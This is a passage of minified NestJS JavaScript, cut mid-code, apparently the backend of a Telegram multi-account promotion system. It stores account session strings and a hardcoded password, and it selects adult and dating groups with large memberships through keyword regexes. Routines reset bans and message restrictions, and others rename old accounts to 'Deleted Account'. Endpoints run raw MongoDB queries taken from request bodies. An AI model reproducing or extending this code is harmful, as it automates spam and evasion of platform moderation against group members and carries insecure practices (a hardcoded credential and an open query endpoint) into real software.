filters"}),(0,p.ApiQuery)({name:"channelId",required:!1,type:String}),(0,p.ApiQuery)({name:"broadcast",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"canSendMsgs",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"participantsCount",required:!1,type:Number}),(0,p.ApiQuery)({name:"restricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"sendMessages",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"title",required:!1,type:String}),(0,p.ApiQuery)({name:"username",required:!1,type:String}),(0,p.ApiQuery)({name:"wordRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"dMRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"availableMsgs",required:!1,type:[String]}),(0,p.ApiQuery)({name:"reactions",required:!1,type:[String]}),(0,p.ApiQuery)({name:"banned",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"reactRestricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"megagroup",required:!1,type:Boolean}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,p.ApiOperation)({summary:"Get all active channels"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":channelId"),(0,p.ApiOperation)({summary:"Get an active channel by channelId"}),n(0,(0,a.Param)("channelId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":channelId"),(0,p.ApiOperation)({summary:"Update an active channel by channelId"}),n(0,(0,a.Param)("channelId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,l.UpdateActiveChannelDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":channelId"),(0,p.ApiOperation)({summary:"Delete an active channel by channelId"}),n(0,(0,a.Param)("channelId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Add reaction to chat group"}),n(0,(0,a.Param)("channelId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.AddReactionDto]),r("design:returntype",Promise)],u.prototype,"addReaction",null),i([(0,a.Get)(":channelId/reactions/random"),(0,p.ApiOperation)({summary:"Get a random reaction from chat group"}),n(0,(0,a.Param)("channelId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"getRandomReaction",null),i([(0,a.Delete)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Remove reaction from chat group"}),n(0,(0,a.Param)("channelId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.AddReactionDto]),r("design:returntype",Promise)],u.prototype,"removeReaction",null),t.ActiveChannelsController=u=i([(0,p.ApiTags)("Active Channels"),(0,a.Controller)("active-channels"),r("design:paramtypes",[s.ActiveChannelsService])],u)},3322:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsModule=void 0;const r=o(3563),n=o(5839),a=o(9155),s=o(7522),c=o(925),l=o(5774),p=o(5014);let d=class{};t.ActiveChannelsModule=d,t.ActiveChannelsModule=d=i([(0,r.Module)({imports:[l.initModule,n.MongooseModule.forFeature([{name:c.ActiveChannel.name,schema:c.ActiveChannelSchema}]),p.PromoteMsgModule],controllers:[s.ActiveChannelsController],providers:[a.ActiveChannelsService],exports:[a.ActiveChannelsService]})],d)},9155:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsService=void 0;const a=o(9199),s=o(3563),c=o(5839),l=o(6037),p=o(925),d=o(6185);let u=class{constructor(e,t){this.activeChannelModel=e,this.promoteMsgsService=t}async create(e){return e.availableMsgs=Object.keys(await this.promoteMsgsService.findOne()),new this.activeChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.activeChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.activeChannelModel.find().exec()}async findOne(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return delete t._id,await this.activeChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async removeFromAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{availableMsgs:t}})}async addToAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{availableMsgs:t}})}async remove(e){await this.activeChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.activeChannelModel.find(e).exec()}async addReactions(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{reactions:t}})}async getRandomReaction(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();if(!t)return;if(0===t.reactions.length)return;const o=Math.floor(Math.random()*t.reactions.length);return t.reactions[o]}async removeReaction(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{reactions:t}})}async getActiveChannels(e=50,t=0,o=[]){const i={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:o},participantsCount:{$gt:600},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},r={participantsCount:-1};try{return await this.activeChannelModel.aggregate([{$match:i},{$skip:t},{$limit:e},{$sort:r},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const r=this.activeChannelModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}async resetWordRestrictions(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for Reset Available Msgs`);try{await this.activeChannelModel.updateMany({banned:!1},{$set:{wordRestriction:0,dMRestriction:0}})}catch(e){console.log((0,d.parseError)(e))}}async resetAvailableMsgs(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for Reset Available Msgs`);try{const e=await this.promoteMsgsService.findOne(),t=Object.keys(e);await this.activeChannelModel.updateMany({$expr:{$lt:[{$size:{$ifNull:["$availableMsgs",[]]}},5]}},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,availableMsgs:t}})}catch(e){console.log((0,d.parseError)(e))}}async updateBannedChannels(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for update banned Channels`),await this.activeChannelModel.updateMany({$or:[{banned:!0},{private:!0}]},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,private:!1}})}async updateDefaultReactions(){await this.activeChannelModel.updateMany({},{$set:{reactions:["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]}})}};t.ActiveChannelsService=u,t.ActiveChannelsService=u=i([(0,s.Injectable)(),n(0,(0,c.InjectModel)(p.ActiveChannel.name)),n(1,(0,s.Inject)((0,s.forwardRef)((()=>a.PromoteMsgsService)))),r("design:paramtypes",[l.Model,a.PromoteMsgsService])],u)},803:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddReactionDto=void 0;const n=o(9742);class a{}t.AddReactionDto=a,i([(0,n.ApiProperty)({required:!0}),r("design:type",Array)],a.prototype,"reactions",void 0)},3585:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateActiveChannelDto=void 0;const n=o(9742);class a{constructor(){this.reactRestricted=!1,this.wordRestriction=0,this.dMRestriction=0,this.reactions=["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""],this.banned=!1,this.private=!1}}t.CreateActiveChannelDto=a,i([(0,n.ApiProperty)(),r("design:type",String)],a.prototype,"channelId",void 0),i([(0,n.ApiProperty)({default:!1}),r("design:type",Boolean)],a.prototype,"broadcast",void 0),i([(0,n.ApiProperty)({default:!0}),r("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,n.ApiProperty)({default:300}),r("design:type",Number)],a.prototype,"participantsCount",void 0),i([(0,n.ApiProperty)({default:!1}),r("design:type",Boolean)],a.prototype,"restricted",void 0),i([(0,n.ApiProperty)({default:!0}),r("design:type",Boolean)],a.prototype,"sendMessages",void 0),i([(0,n.ApiProperty)({default:!1}),r("design:type",Boolean)],a.prototype,"reactRestricted",void 0),i([(0,n.ApiProperty)(),r("design:type",String)],a.prototype,"title",void 0),i([(0,n.ApiProperty)(),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiProperty)({default:0}),r("design:type",Number)],a.prototype,"wordRestriction",void 0),i([(0,n.ApiProperty)({default:0}),r("design:type",Number)],a.prototype,"dMRestriction",void 0),i([(0,n.ApiProperty)({type:[String]}),r("design:type",Array)],a.prototype,"availableMsgs",void 0),i([(0,n.ApiProperty)({type:[String],default:["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]}),r("design:type",Array)],a.prototype,"reactions",void 0),i([(0,n.ApiProperty)({default:!1}),r("design:type",Boolean)],a.prototype,"banned",void 0),i([(0,n.ApiProperty)({default:!0,required:!1}),r("design:type",Boolean)],a.prototype,"megagroup",void 0),i([(0,n.ApiProperty)({default:!1,required:!1}),r("design:type",Boolean)],a.prototype,"forbidden",void 0),i([(0,n.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),r("design:type",Boolean)],a.prototype,"private",void 0)},5926:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateActiveChannelDto=void 0;const i=o(9742),r=o(3585);class n extends((0,i.PartialType)(r.CreateActiveChannelDto)){}t.UpdateActiveChannelDto=n},925:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},s=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),c=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelSchema=t.ActiveChannel=void 0;const l=o(5839),p=s(o(6037)),d=o(9742),u=o(6185);let f=class{};t.ActiveChannel=f,a([(0,d.ApiProperty)({required:!0}),(0,l.Prop)({required:!0,unique:!0}),c("design:type",String)],f.prototype,"channelId",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"broadcast",void 0),a([(0,d.ApiProperty)({default:!0}),(0,l.Prop)({default:!0}),c("design:type",Boolean)],f.prototype,"canSendMsgs",void 0),a([(0,d.ApiProperty)({type:Number,default:0}),(0,l.Prop)({type:p.Schema.Types.Number,default:0}),c("design:type",Number)],f.prototype,"participantsCount",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"restricted",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"sendMessages",void 0),a([(0,d.ApiProperty)({required:!0}),(0,l.Prop)({required:!0}),c("design:type",String)],f.prototype,"title",void 0),a([(0,d.ApiProperty)({required:!1,default:null}),(0,l.Prop)({required:!1,default:null}),c("design:type",String)],f.prototype,"username",void 0),a([(0,d.ApiProperty)({type:Number,default:0}),(0,l.Prop)({type:p.Schema.Types.Number,default:0}),c("design:type",Number)],f.prototype,"wordRestriction",void 0),a([(0,d.ApiProperty)({type:Number,default:0}),(0,l.Prop)({type:p.Schema.Types.Number,default:0}),c("design:type",Number)],f.prototype,"dMRestriction",void 0),a([(0,d.ApiProperty)({type:[String],default:u.defaultMessages}),(0,l.Prop)({type:[String],default:u.defaultMessages}),c("design:type",Array)],f.prototype,"availableMsgs",void 0),a([(0,d.ApiProperty)({type:[String],default:u.defaultReactions}),(0,l.Prop)({type:[String],default:u.defaultReactions}),c("design:type",Array)],f.prototype,"reactions",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"banned",void 0),a([(0,d.ApiProperty)({default:!0}),(0,l.Prop)({default:!0}),c("design:type",Boolean)],f.prototype,"megagroup",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"private",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"reactRestricted",void 0),a([(0,d.ApiProperty)({default:!1}),(0,l.Prop)({default:!1}),c("design:type",Boolean)],f.prototype,"forbidden",void 0),t.ActiveChannel=f=a([(0,l.Schema)({collection:"activeChannels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],f),t.ActiveChannelSchema=l.SchemaFactory.createForClass(f)},6501:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientController=void 0;const a=o(3563),s=o(9742),c=o(9646),l=o(9815),p=o(1167),d=o(7908);let u=class{constructor(e){this.archivedclientService=e}async create(e){return this.archivedclientService.create(e)}async search(e){return this.archivedclientService.search(e)}async findAll(){return this.archivedclientService.findAll()}async checkArchivedClients(){return this.archivedclientService.checkArchivedClients()}async findOne(e){return this.archivedclientService.findOne(e)}async fetchOne(e){return this.archivedclientService.fetchOne(e)}async update(e,t){return this.archivedclientService.update(e,t)}async remove(e){return this.archivedclientService.remove(e)}async executeQuery(e){try{return await this.archivedclientService.executeQuery(e)}catch(e){throw e}}};t.ArchivedClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateClientDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchClientDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("checkArchivedClients"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"checkArchivedClients",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Get)("fetchOne/:mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"fetchOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("mobile")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateClientDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),t.ArchivedClientController=u=i([(0,s.ApiTags)("Archived Clients"),(0,a.Controller)("archived-clients"),r("design:paramtypes",[c.ArchivedClientService])],u)},6061:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientModule=void 0;const r=o(3563),n=o(5839),a=o(1013),s=o(282),c=o(9646),l=o(6501),p=o(5774),d=o(8009);let u=class{};t.ArchivedClientModule=u,t.ArchivedClientModule=u=i([(0,r.Module)({imports:[p.initModule,n.MongooseModule.forFeature([{collection:"ArchivedClients",name:"ArchivedArchivedClientsModule",schema:a.ClientSchema}]),(0,r.forwardRef)((()=>s.TelegramModule)),(0,r.forwardRef)((()=>d.ClientModule))],controllers:[l.ArchivedClientController],providers:[c.ArchivedClientService],exports:[c.ArchivedClientService]})],u)},9646:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(2995),p=o(7385),d=o(5562),u=o(6185);let f=class{constructor(e,t,o){this.archivedclientModel=e,this.telegramService=t,this.clientService=o}async create(e){return new this.archivedclientModel(e).save()}async findAll(){return await this.archivedclientModel.find().exec()}async findOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();return t}async fetchOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();if(t)return t;try{await this.telegramService.createClient(e,!1,!0);const t=await this.telegramService.createNewSession(e);return await this.telegramService.deleteClient(e),await this.create({channelLink:"default",clientId:"default",dbcoll:"default",deployKey:"default",link:"default",mainAccount:"default",promoteRepl:"default",name:"default",password:"Ajtdmwajt1@",repl:"default",session:t,username:"default",mobile:e,product:"default"})}catch(t){throw await this.telegramService.deleteClient(e),new a.NotFoundException((0,u.parseError)(t).message)}}async update(e,t){return delete t._id,t._doc&&delete t._doc._id,console.log({...t}),await this.archivedclientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){const t=await this.archivedclientModel.findOneAndDelete({mobile:e}).exec();if(!t)throw new a.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.archivedclientModel.find(e).exec()}async checkArchivedClients(){await this.telegramService.disconnectAll(),await(0,p.sleep)(2e3);const e=await this.findAll(),t=(await this.clientService.findAll()).map((e=>e.mobile));return e.map((async e=>{if(t.includes(e.mobile))console.log("Number is a Active Client");else try{await this.telegramService.createClient(e.mobile,!0,!1),await this.telegramService.updateUsername(e.mobile,""),await this.telegramService.updateNameandBio(e.mobile,"Deleted Account",""),await this.telegramService.deleteClient(e.mobile),await(0,p.sleep)(2e3)}catch(t){console.log(e.mobile," :  false"),this.remove(e.mobile),await this.telegramService.deleteClient(e.mobile)}})),"Triggered ArchiveClients check"}async executeQuery(e){try{if(!e)throw new a.BadRequestException("Query is invalid.");return await this.archivedclientModel.find(e).exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}};t.ArchivedClientService=f,t.ArchivedClientService=f=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("ArchivedArchivedClientsModule")),n(1,(0,a.Inject)((0,a.forwardRef)((()=>l.TelegramService)))),n(2,(0,a.Inject)((0,a.forwardRef)((()=>d.ClientService)))),r("design:paramtypes",[c.Model,l.TelegramService,d.ClientService])],f)},5853:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientController=void 0;const a=o(3563),s=o(9742),c=o(4374),l=o(9139),p=o(2843),d=o(5042);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforBufferClients(){return this.clientService.joinchannelForBufferClients()}async checkbufferClients(){return this.clientService.checkBufferClients(),"initiated Checking"}async addNewUserstoBufferClients(e){return this.clientService.addNewUserstoBufferClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsBufferClient(e){return await this.clientService.setAsBufferClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.BufferClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateBufferClientDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchBufferClientDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("joinChannelsForBufferClients"),(0,s.ApiOperation)({summary:"Join Channels for BufferClients"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"joinChannelsforBufferClients",null),i([(0,a.Get)("checkBufferClients"),(0,s.ApiOperation)({summary:"Check Buffer Clients"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"checkbufferClients",null),i([(0,a.Post)("addNewUserstoBufferClients"),(0,s.ApiOperation)({summary:"Add New Users to Buffer Clients"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"addNewUserstoBufferClients",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("SetAsBufferClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Buffer Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"setAsBufferClient",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("mobile")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateBufferClientDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("mobile")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateBufferClientDto]),r("design:returntype",Promise)],u.prototype,"createdOrupdate",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),t.BufferClientController=u=i([(0,s.ApiTags)("Buffer Clients"),(0,a.Controller)("bufferclients"),r("design:paramtypes",[c.BufferClientService])],u)},8421:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var 